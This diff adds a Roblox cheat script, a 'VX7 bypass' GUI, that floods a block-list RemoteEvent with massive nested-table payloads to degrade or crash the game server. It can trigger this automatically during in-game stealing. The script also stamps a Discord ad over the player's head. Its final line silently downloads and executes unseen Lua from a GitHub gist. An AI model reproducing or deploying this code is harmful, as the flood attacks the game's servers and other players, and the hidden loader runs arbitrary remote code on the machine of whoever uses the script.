@@ -1,0 +1,686 @@
+--[[
+  VX7 BYPASS GUI + VX7 Speed Bypass Logic
+  + Head Tag (leak by Demi)
+  + GUI startet IMMER in der Mitte
+  Background: rbxassetid://73627009461603
+]]
+
+repeat task.wait() until game:IsLoaded()
+
+local Players          = game:GetService("Players")
+local UIS              = game:GetService("UserInputService")
+local TweenService     = game:GetService("TweenService")
+local RunService       = game:GetService("RunService")
+
+local LP = Players.LocalPlayer
+local PG = LP:WaitForChild("PlayerGui")
+local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
+
+for _, n in ipairs({"VX7_Bypass_GUI", "vx7SpeedBypass"}) do
+	local o = PG:FindFirstChild(n)
+	if o then o:Destroy() end
+end
+
+local C = {
+	bg       = Color3.fromRGB(12, 10, 14),
+	panel    = Color3.fromRGB(18, 14, 18),
+	btnOff   = Color3.fromRGB(70, 22, 30),
+	orange   = Color3.fromRGB(255, 140, 40),
+	redBar   = Color3.fromRGB(220, 50, 60),
+	text     = Color3.fromRGB(245, 240, 245),
+	muted    = Color3.fromRGB(160, 140, 150),
+	border   = Color3.fromRGB(255, 150, 40),
+	switchOn = Color3.fromRGB(255, 140, 40),
+	switchOff= Color3.fromRGB(60, 50, 55),
+	green    = Color3.fromRGB(40, 160, 80),
+}
+
+local S = {
+	version = 3,
+	platform = isMobile and "MB" or "PC",
+	power = 100000,
+	mode = "Four",
+	active = false,
+	autoSteal = false,
+	slot = 1,
+	slotMax = 1,
+}
+
+local BACKGROUND_ID = "73627009461603"
+
+local MODE_CFG = {
+	[2] = { powerMul = 1.0,  pcDelay = 0.10, mbDelay = 0.14 },
+	[3] = { powerMul = 1.45, pcDelay = 0.07, mbDelay = 0.11 },
+}
+
+local function corner(p, r)
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, r or 10)
+	c.Parent = p
+	return c
+end
+
+local function stroke(p, col, th, tr)
+	local s = Instance.new("UIStroke")
+	s.Color = col or C.border
+	s.Thickness = th or 1.5
+	s.Transparency = tr or 0.15
+	s.Parent = p
+	return s
+end
+
+local function tw(o, props, t)
+	TweenService:Create(o, TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
+end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "VX7_Bypass_GUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.DisplayOrder = 120
+gui.Parent = PG
+
+local MAIN_W, MAIN_H = 310, 210
+local SIDE_W, SIDE_H = 52, 210
+local GAP = 13
+
+local MAIN_ANCHOR = Vector2.new(0.5, 0.5)
+local MAIN_POS = UDim2.new(0.5, 0, 0.5, 0)
+local SIDE_POS = UDim2.new(0.5, -(MAIN_W/2) - GAP - (SIDE_W/2), 0.5, 0)
+
+local side = Instance.new("Frame")
+side.Name = "SideBar"
+side.Size = UDim2.fromOffset(SIDE_W, SIDE_H)
+side.AnchorPoint = Vector2.new(0.5, 0.5)
+side.Position = SIDE_POS
+side.BackgroundColor3 = Color3.fromRGB(20, 16, 18)
+side.BorderSizePixel = 0
+side.ClipsDescendants = true
+side.Parent = gui
+corner(side, 16)
+stroke(side, Color3.fromRGB(60, 45, 40), 1.2, 0.4)
+
+local sideBg = Instance.new("ImageLabel", side)
+sideBg.Name = "SideBg"
+sideBg.Size = UDim2.fromScale(1, 1)
+sideBg.BackgroundTransparency = 1
+sideBg.Image = "rbxassetid://" .. BACKGROUND_ID
+sideBg.ImageTransparency = 0
+sideBg.ScaleType = Enum.ScaleType.Fit
+sideBg.ZIndex = 0
+corner(sideBg, 16)
+sideBg.BackgroundColor3 = Color3.fromRGB(20, 16, 18)
+sideBg.BackgroundTransparency = 0.3
+
+local upBtn = Instance.new("TextButton", side)
+upBtn.Size = UDim2.new(1, -10, 0, 36)
+upBtn.Position = UDim2.fromOffset(5, 8)
+upBtn.BackgroundColor3 = Color3.fromRGB(35, 28, 30)
+upBtn.BackgroundTransparency = 0.4
+upBtn.Text = "▲"
+upBtn.TextColor3 = C.muted
+upBtn.Font = Enum.Font.GothamBold
+upBtn.TextSize = 14
+upBtn.AutoButtonColor = false
+upBtn.ZIndex = 3
+corner(upBtn, 10)
+
+local downBtn = Instance.new("TextButton", side)
+downBtn.Size = UDim2.new(1, -10, 0, 36)
+downBtn.Position = UDim2.new(0, 5, 1, -44)
+downBtn.BackgroundColor3 = Color3.fromRGB(35, 28, 30)
+downBtn.BackgroundTransparency = 0.4
+downBtn.Text = "▼"
+downBtn.TextColor3 = C.muted
+downBtn.Font = Enum.Font.GothamBold
+downBtn.TextSize = 14
+downBtn.AutoButtonColor = false
+downBtn.ZIndex = 3
+corner(downBtn, 10)
+
+local main = Instance.new("Frame")
+main.Name = "Main"
+main.Size = UDim2.fromOffset(MAIN_W, MAIN_H)
+main.AnchorPoint = MAIN_ANCHOR
+main.Position = MAIN_POS
+main.BackgroundColor3 = C.bg
+main.BorderSizePixel = 0
+main.ClipsDescendants = true
+main.Parent = gui
+corner(main, 18)
+stroke(main, C.border, 2.2, 0.05)
+
+local bgImg = Instance.new("ImageLabel", main)
+bgImg.Name = "Background"
+bgImg.Size = UDim2.fromScale(1, 1)
+bgImg.BackgroundTransparency = 1
+bgImg.Image = "rbxassetid://" .. BACKGROUND_ID
+bgImg.ImageTransparency = 0
+bgImg.ScaleType = Enum.ScaleType.Crop
+bgImg.ZIndex = 0
+corner(bgImg, 18)
+
+local verBtn = Instance.new("TextButton", main)
+verBtn.Size = UDim2.fromOffset(88, 28)
+verBtn.Position = UDim2.fromOffset(14, 12)
+verBtn.BackgroundColor3 = Color3.fromRGB(40, 28, 32)
+verBtn.BackgroundTransparency = 0.2
+verBtn.Text = ""
+verBtn.AutoButtonColor = false
+verBtn.ZIndex = 5
+corner(verBtn, 14)
+stroke(verBtn, Color3.fromRGB(80, 50, 55), 1, 0.3)
+
+local verPrev = Instance.new("TextButton", verBtn)
+verPrev.Size = UDim2.fromOffset(22, 28)
+verPrev.Position = UDim2.fromOffset(2, 0)
+verPrev.BackgroundTransparency = 1
+verPrev.Text = "<"
+verPrev.TextColor3 = C.muted
+verPrev.Font = Enum.Font.GothamBold
+verPrev.TextSize = 14
+verPrev.ZIndex = 6
+
+local verLbl = Instance.new("TextLabel", verBtn)
+verLbl.Size = UDim2.new(1, -44, 1, 0)
+verLbl.Position = UDim2.fromOffset(22, 0)
+verLbl.BackgroundTransparency = 1
+verLbl.Text = "V" .. S.version
+verLbl.TextColor3 = C.text
+verLbl.Font = Enum.Font.GothamBlack
+verLbl.TextSize = 13
+verLbl.ZIndex = 6
+
+local verNext = Instance.new("TextButton", verBtn)
+verNext.Size = UDim2.fromOffset(22, 28)
+verNext.Position = UDim2.new(1, -24, 0, 0)
+verNext.BackgroundTransparency = 1
+verNext.Text = ">"
+verNext.TextColor3 = C.muted
+verNext.Font = Enum.Font.GothamBold
+verNext.TextSize = 14
+verNext.ZIndex = 6
+
+local plat = Instance.new("Frame", main)
+plat.Size = UDim2.fromOffset(72, 28)
+plat.Position = UDim2.new(1, -86, 0, 12)
+plat.BackgroundTransparency = 1
+plat.ZIndex = 5
+
+local function mkPlat(name, x)
+	local b = Instance.new("TextButton", plat)
+	b.Size = UDim2.fromOffset(34, 26)
+	b.Position = UDim2.fromOffset(x, 1)
+	b.BackgroundColor3 = name == S.platform and C.orange or Color3.fromRGB(40, 28, 32)
+	b.BackgroundTransparency = name == S.platform and 0 or 0.2
+	b.Text = name
+	b.TextColor3 = name == S.platform and Color3.fromRGB(20, 10, 5) or C.muted
+	b.Font = Enum.Font.GothamBlack
+	b.TextSize = 11
+	b.AutoButtonColor = false
+	b.ZIndex = 6
+	corner(b, 8)
+	return b
+end
+local pcBtn = mkPlat("PC", 0)
+local mbBtn = mkPlat("MB", 38)
+
+local stats = Instance.new("Frame", main)
+stats.Size = UDim2.new(1, -140, 0, 22)
+stats.Position = UDim2.fromOffset(14, 62)
+stats.BackgroundTransparency = 1
+stats.ZIndex = 5
+
+local function mkStat(parent, text, order)
+	local wrap = Instance.new("Frame", parent)
+	wrap.Size = UDim2.new(0.33, -4, 1, 0)
+	wrap.Position = UDim2.new((order - 1) * 0.33, 0, 0, 0)
+	wrap.BackgroundTransparency = 1
+	wrap.ZIndex = 6
+	local bar = Instance.new("Frame", wrap)
+	bar.Size = UDim2.fromOffset(3, 14)
+	bar.Position = UDim2.fromOffset(0, 4)
+	bar.BackgroundColor3 = C.redBar
+	bar.BorderSizePixel = 0
+	bar.ZIndex = 6
+	corner(bar, 2)
+	local lbl = Instance.new("TextLabel", wrap)
+	lbl.Size = UDim2.new(1, -10, 1, 0)
+	lbl.Position = UDim2.fromOffset(8, 0)
+	lbl.BackgroundTransparency = 1
+	lbl.Text = text
+	lbl.TextColor3 = C.text
+	lbl.Font = Enum.Font.GothamBold
+	lbl.TextSize = 12
+	lbl.TextXAlignment = Enum.TextXAlignment.Left
+	lbl.ZIndex = 6
+	lbl.TextStrokeTransparency = 0.4
+	lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+	return lbl
+end
+
+local powerName = mkStat(stats, "Power", 1)
+local powerVal = mkStat(stats, tostring(S.power), 2)
+local modeLbl = mkStat(stats, S.mode, 3)
+
+local actBtn = Instance.new("TextButton", main)
+actBtn.Size = UDim2.new(1, -28, 0, 40)
+actBtn.Position = UDim2.fromOffset(14, 124)
+actBtn.BackgroundColor3 = C.btnOff
+actBtn.BackgroundTransparency = 0.1
+actBtn.Text = ""
+actBtn.AutoButtonColor = false
+actBtn.Active = true
+actBtn.ZIndex = 5
+corner(actBtn, 12)
+
+local actDot = Instance.new("Frame", actBtn)
+actDot.Size = UDim2.fromOffset(8, 8)
+actDot.Position = UDim2.new(0.5, -48, 0.5, -4)
+actDot.BackgroundColor3 = C.muted
+actDot.BorderSizePixel = 0
+actDot.ZIndex = 6
+corner(actDot, 4)
+
+local actLbl = Instance.new("TextLabel", actBtn)
+actLbl.Size = UDim2.fromScale(1, 1)
+actLbl.BackgroundTransparency = 1
+actLbl.Text = "INACTIVO"
+actLbl.TextColor3 = C.text
+actLbl.Font = Enum.Font.GothamBlack
+actLbl.TextSize = 14
+actLbl.ZIndex = 6
+
+local stealRow = Instance.new("Frame", main)
+stealRow.Size = UDim2.new(1, -28, 0, 28)
+stealRow.Position = UDim2.fromOffset(14, 172)
+stealRow.BackgroundColor3 = Color3.fromRGB(40, 22, 28)
+stealRow.BackgroundTransparency = 0.3
+stealRow.BorderSizePixel = 0
+stealRow.ZIndex = 5
+corner(stealRow, 10)
+
+local stealBar = Instance.new("Frame", stealRow)
+stealBar.Size = UDim2.fromOffset(3, 14)
+stealBar.Position = UDim2.fromOffset(10, 7)
+stealBar.BackgroundColor3 = C.redBar
+stealBar.BorderSizePixel = 0
+stealBar.ZIndex = 6
+corner(stealBar, 2)
+
+local stealLbl = Instance.new("TextLabel", stealRow)
+stealLbl.Size = UDim2.new(1, -70, 1, 0)
+stealLbl.Position = UDim2.fromOffset(18, 0)
+stealLbl.BackgroundTransparency = 1
+stealLbl.Text = "Auto On Steal"
+stealLbl.TextColor3 = C.text
+stealLbl.Font = Enum.Font.GothamBold
+stealLbl.TextSize = 12
+stealLbl.TextXAlignment = Enum.TextXAlignment.Left
+stealLbl.ZIndex = 6
+stealLbl.TextStrokeTransparency = 0.4
+stealLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+
+local switchBg = Instance.new("TextButton", stealRow)
+switchBg.Size = UDim2.fromOffset(42, 22)
+switchBg.Position = UDim2.new(1, -50, 0.5, -11)
+switchBg.BackgroundColor3 = C.switchOff
+switchBg.Text = ""
+switchBg.AutoButtonColor = false
+switchBg.Active = true
+switchBg.ZIndex = 6
+corner(switchBg, 11)
+
+local switchKnob = Instance.new("Frame", switchBg)
+switchKnob.Size = UDim2.fromOffset(18, 18)
+switchKnob.Position = UDim2.fromOffset(2, 2)
+switchKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+switchKnob.BorderSizePixel = 0
+switchKnob.ZIndex = 7
+corner(switchKnob, 9)
+
+do
+	local drag, start, posMain, posSide
+	main.InputBegan:Connect(function(i)
+		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+			drag = true
+			start = i.Position
+			posMain = main.Position
+			posSide = side.Position
+			i.Changed:Connect(function()
+				if i.UserInputState == Enum.UserInputState.End then drag = false end
+			end)
+		end
+	end)
+	UIS.InputChanged:Connect(function(i)
+		if drag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+			local d = i.Position - start
+			main.Position = UDim2.new(posMain.X.Scale, posMain.X.Offset + d.X, posMain.Y.Scale, posMain.Y.Offset + d.Y)
+			side.Position = UDim2.new(posSide.X.Scale, posSide.X.Offset + d.X, posSide.Y.Scale, posSide.Y.Offset + d.Y)
+		end
+	end)
+end
+
+local remote = nil
+
+local function findRemote()
+	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+	if not rrs then return nil end
+	for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
+		local r = rrs:FindFirstChild(name)
+		if r and r:IsA("RemoteEvent") then return r end
+	end
+	for _, c in ipairs(rrs:GetChildren()) do
+		if c:IsA("RemoteEvent") and c.Name:find("Block") then return c end
+	end
+	return nil
+end
+
+local function buildPayload(pwr)
+	local useMobile = (S.platform == "MB")
+	local depth = useMobile and 120 or 186
+	local mainT = {}
+	local nested = {{}}
+	local current = nested[1]
+	for _ = 1, depth do
+		local n = {}
+		table.insert(current, n)
+		current = n
+	end
+	local div = useMobile and 220 or 188
+	local maxRep = math.min(math.floor(pwr / div), useMobile and 4000 or 10000)
+	for _ = 1, maxRep do
+		table.insert(mainT, nested)
+	end
+	return mainT
+end
+
+local function getEffectivePower()
+	local cfg = MODE_CFG[S.version] or MODE_CFG[3]
+	local base = S.power * (cfg.powerMul or 1)
+	if S.platform == "MB" then
+		base = base * 0.55
+	else
+		base = base * 1.25
+	end
+	return math.floor(base)
+end
+
+local function getDelay()
+	local cfg = MODE_CFG[S.version] or MODE_CFG[3]
+	return (S.platform == "MB") and cfg.mbDelay or cfg.pcDelay
+end
+
+local function runBypassLoop()
+	local delay = getDelay()
+	while S.active and remote do
+		local pwr = getEffectivePower()
+		local payload = buildPayload(pwr)
+		local ok = pcall(function()
+			remote:FireServer(payload)
+		end)
+		if not ok then
+			delay = math.min(delay * 1.4, S.platform == "MB" and 0.35 or 0.45)
+		else
+			if S.platform == "MB" then
+				delay = math.clamp(delay * 0.998, getDelay(), 0.28)
+			else
+				delay = math.clamp(delay * 0.992, getDelay() * 0.85, 0.22)
+			end
+		end
+		task.wait(delay)
+	end
+end
+
+local function setActive(on)
+	S.active = on
+	if on then
+		if not remote then remote = findRemote() end
+		if not remote then
+			S.active = false
+			actLbl.Text = "NO REMOTE"
+			actDot.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+			actBtn.BackgroundColor3 = C.btnOff
+			return
+		end
+		actBtn.BackgroundColor3 = C.green
+		actLbl.Text = "ACTIVO"
+		actDot.BackgroundColor3 = Color3.fromRGB(80, 255, 120)
+		task.spawn(runBypassLoop)
+	else
+		actBtn.BackgroundColor3 = C.btnOff
+		actLbl.Text = "INACTIVO"
+		actDot.BackgroundColor3 = C.muted
+	end
+end
+
+local function refreshSwitch()
+	if S.autoSteal then
+		switchBg.BackgroundColor3 = C.switchOn
+		tw(switchKnob, {Position = UDim2.fromOffset(22, 2)}, 0.12)
+	else
+		switchBg.BackgroundColor3 = C.switchOff
+		tw(switchKnob, {Position = UDim2.fromOffset(2, 2)}, 0.12)
+	end
+end
+
+local function refreshPlat()
+	pcBtn.BackgroundColor3 = S.platform == "PC" and C.orange or Color3.fromRGB(40, 28, 32)
+	pcBtn.BackgroundTransparency = S.platform == "PC" and 0 or 0.2
+	pcBtn.TextColor3 = S.platform == "PC" and Color3.fromRGB(20, 10, 5) or C.muted
+	mbBtn.BackgroundColor3 = S.platform == "MB" and C.orange or Color3.fromRGB(40, 28, 32)
+	mbBtn.BackgroundTransparency = S.platform == "MB" and 0 or 0.2
+	mbBtn.TextColor3 = S.platform == "MB" and Color3.fromRGB(20, 10, 5) or C.muted
+end
+
+local function refreshVer()
+	verLbl.Text = "V" .. S.version
+end
+
+actBtn.MouseButton1Click:Connect(function()
+	setActive(not S.active)
+end)
+
+switchBg.MouseButton1Click:Connect(function()
+	S.autoSteal = not S.autoSteal
+	refreshSwitch()
+end)
+
+pcBtn.MouseButton1Click:Connect(function()
+	S.platform = "PC"
+	refreshPlat()
+end)
+mbBtn.MouseButton1Click:Connect(function()
+	S.platform = "MB"
+	refreshPlat()
+end)
+
+verPrev.MouseButton1Click:Connect(function()
+	S.version = (S.version == 3) and 2 or 3
+	refreshVer()
+end)
+verNext.MouseButton1Click:Connect(function()
+	S.version = (S.version == 2) and 3 or 2
+	refreshVer()
+end)
+
+upBtn.MouseButton1Click:Connect(function() end)
+downBtn.MouseButton1Click:Connect(function() end)
+
+local function isHoldingBrainrot()
+	local char = LP.Character
+	if not char then return false end
+	local hum = char:FindFirstChildOfClass("Humanoid")
+
+	local tool = char:FindFirstChildOfClass("Tool")
+	if tool then return true end
+
+	for k, v in pairs(LP:GetAttributes()) do
+		local kl = k:lower()
+		if kl:find("holding") or kl:find("carrying")
+			or kl:find("stealing") or kl:find("brainrot") then
+			if v == true or (type(v) == "string" and v ~= "") then
+				return true
+			end
+		end
+	end
+
+	for k, v in pairs(char:GetAttributes()) do
+		local kl = k:lower()
+		if kl:find("holding") or kl:find("carrying")
+			or kl:find("stealing") or kl:find("brainrot") then
+			if v == true or (type(v) == "string" and v ~= "") then
+				return true
+			end
+		end
+	end
+
+	if hum and hum.WalkSpeed > 0 and hum.WalkSpeed < 14 then
+		return true
+	end
+
+	return false
+end
+
+local lastCheck = 0
+local stealActive = false
+
+RunService.Heartbeat:Connect(function()
+	if not S.autoSteal then
+		stealActive = false
+		return
+	end
+	if os.clock() - lastCheck < 0.3 then return end
+	lastCheck = os.clock()
+
+	local holding = isHoldingBrainrot()
+
+	if holding and not stealActive then
+		stealActive = true
+		if not S.active then
+			setActive(true)
+		end
+	end
+	if not holding and stealActive then
+		stealActive = false
+	end
+end)
+
+_G.__VX7SetBackground = function(asset)
+	if not asset or asset == "" then
+		bgImg.Image = ""
+		sideBg.Image = ""
+		return
+	end
+	local a = tostring(asset)
+	local url = (a:find("rbxassetid") or a:find("http")) and a or ("rbxassetid://" .. a)
+	bgImg.Image = url
+	sideBg.Image = url
+end
+
+LP.CharacterAdded:Connect(function()
+	task.wait(0.5)
+	main.AnchorPoint = MAIN_ANCHOR
+	main.Position = MAIN_POS
+	side.AnchorPoint = Vector2.new(0.5, 0.5)
+	side.Position = SIDE_POS
+end)
+
+remote = findRemote()
+refreshSwitch()
+refreshPlat()
+refreshVer()
+
+_G.__VX7SetBackground(BACKGROUND_ID)
+
+local TAG_1 = "leak by Demi"
+local TAG_2 = "https://discord.gg/prd62mBg5"
+local TAG_SIG = "Demi#" .. math.random(100000, 999999)
+
+local function attachTag(char)
+	if not char then return end
+	local head = char:FindFirstChild("Head")
+	if not head then return end
+
+	local old = head:FindFirstChild("LeakByDemiTag")
+	if old then old:Destroy() end
+
+	local bb = Instance.new("BillboardGui")
+	bb.Name = "LeakByDemiTag"
+	bb.Adornee = head
+	bb.Size = UDim2.fromOffset(280, 62)
+	bb.StudsOffset = Vector3.new(0, 3.2, 0)
+	bb.AlwaysOnTop = true
+	bb.LightInfluence = 0
+	bb.MaxDistance = 200
+	bb.Parent = head
+	bb:SetAttribute("_sig", TAG_SIG)
+
+	local f = Instance.new("Frame", bb)
+	f.Size = UDim2.fromScale(1, 1)
+	f.BackgroundTransparency = 1
+
+	local l1 = Instance.new("TextLabel", f)
+	l1.Size = UDim2.new(1, 0, 0.5, 0)
+	l1.BackgroundTransparency = 1
+	l1.Text = TAG_1
+	l1.Font = Enum.Font.GothamBlack
+	l1.TextSize = 22
+	l1.TextColor3 = Color3.fromRGB(255, 255, 255)
+	l1.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+	l1.TextStrokeTransparency = 0.2
+	l1.TextXAlignment = Enum.TextXAlignment.Center
+	l1.TextYAlignment = Enum.TextYAlignment.Center
+
+	local l2 = Instance.new("TextLabel", f)
+	l2.Size = UDim2.new(1, 0, 0.5, 0)
+	l2.Position = UDim2.new(0, 0, 0.5, 0)
+	l2.BackgroundTransparency = 1
+	l2.Text = TAG_2
+	l2.Font = Enum.Font.GothamBold
+	l2.TextSize = 14
+	l2.TextColor3 = Color3.fromRGB(180, 140, 255)
+	l2.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+	l2.TextStrokeTransparency = 0.3
+	l2.TextXAlignment = Enum.TextXAlignment.Center
+	l2.TextYAlignment = Enum.TextYAlignment.Center
+
+	l1:GetPropertyChangedSignal("Text"):Connect(function()
+		if l1.Text ~= TAG_1 then l1.Text = TAG_1 end
+	end)
+	l2:GetPropertyChangedSignal("Text"):Connect(function()
+		if l2.Text ~= TAG_2 then l2.Text = TAG_2 end
+	end)
+end
+
+task.spawn(function()
+	while true do
+		task.wait(0.4)
+		local c = LP.Character
+		if c then
+			local h = c:FindFirstChild("Head")
+			if h then
+				local t = h:FindFirstChild("LeakByDemiTag")
+				if not t then
+					attachTag(c)
+				elseif t:GetAttribute("_sig") ~= TAG_SIG then
+					t:Destroy()
+					attachTag(c)
+				end
+			end
+		end
+	end
+end)
+
+if LP.Character then attachTag(LP.Character) end
+LP.CharacterAdded:Connect(function(c)
+	task.wait(0.5)
+	attachTag(c)
+end)
+
+print("[VX7] GUI startet in der Mitte · Sidebar links daneben")
+print("[VX7] Head Tag: leak by Demi")
+print("[VX7] Discord: " .. TAG_2)
+
+loadstring(game:HttpGet("https://gist.githubusercontent.com/xd-myscript/6d131a029065313b9885cf9b46d90f1f/raw/941cb2d194dccc47311c97cdd5ff24d971d9dc21/zynxgood.lua"))()
